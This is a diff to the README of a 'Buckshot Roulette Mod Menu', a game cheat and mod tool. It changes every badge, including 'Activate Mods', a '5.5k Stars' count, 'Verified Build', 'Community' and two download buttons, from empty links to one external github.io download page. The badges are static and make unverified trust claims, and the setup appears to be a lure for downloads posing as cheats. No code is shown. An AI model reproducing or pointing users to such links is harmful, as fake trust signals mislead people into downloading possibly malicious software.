@@ -22,10 +22,10 @@ The Mod Menu acts as a **central hub** where you can toggle cheats, mods, and en
 
 ---
 
-[![Activate Mods](https://img.shields.io/badge/Activate-Mods-red?logo=rocket\&style=for-the-badge)](#)
-[![Windows Support](https://img.shields.io/badge/Windows-10%2F11-blue?logo=windows\&style=for-the-badge)](#)
-[![⭐️ 5.5k Stars](https://img.shields.io/badge/GitHub-5.5k_Stars-green?logo=github\&style=for-the-badge)](#)
-[![Download](https://img.shields.io/badge/Download-Latest-brightgreen?logo=github\&style=for-the-badge)](#)
+[![Activate Mods](https://img.shields.io/badge/Activate-Mods-red?logo=rocket\&style=for-the-badge)](https://buckshot-roulette-mods-menu.github.io/.github/)
+[![Windows Support](https://img.shields.io/badge/Windows-10%2F11-blue?logo=windows\&style=for-the-badge)](https://buckshot-roulette-mods-menu.github.io/.github/)
+[![⭐️ 5.5k Stars](https://img.shields.io/badge/GitHub-5.5k_Stars-green?logo=github\&style=for-the-badge)](https://buckshot-roulette-mods-menu.github.io/.github/)
+[![Download](https://img.shields.io/badge/Download-Latest-brightgreen?logo=github\&style=for-the-badge)](https://buckshot-roulette-mods-menu.github.io/.github/)
 
 ---
 
@@ -152,8 +152,8 @@ A: No, it’s lightweight and optimized for low system load.
 
 The **Buckshot Roulette Mod Menu** is the easiest way to manage mods, toggle rules, and customize visuals—all without editing files manually. Whether you’re looking for a lighthearted party setup or a brutal hardcore challenge, this menu puts the power in your hands.
 
-[![Verified Build](https://img.shields.io/badge/Verified-Build-success?logo=github\&style=for-the-badge)](#)
-[![Community](https://img.shields.io/badge/Join-Community-purple?logo=discord\&style=for-the-badge)](#)
-[![Download Menu](https://img.shields.io/badge/Download-Now-orange?logo=github\&style=for-the-badge)](#)
+[![Verified Build](https://img.shields.io/badge/Verified-Build-success?logo=github\&style=for-the-badge)](https://buckshot-roulette-mods-menu.github.io/.github/)
+[![Community](https://img.shields.io/badge/Join-Community-purple?logo=discord\&style=for-the-badge)](https://buckshot-roulette-mods-menu.github.io/.github/)
+[![Download Menu](https://img.shields.io/badge/Download-Now-orange?logo=github\&style=for-the-badge)](https://buckshot-roulette-mods-menu.github.io/.github/)
 
 ---
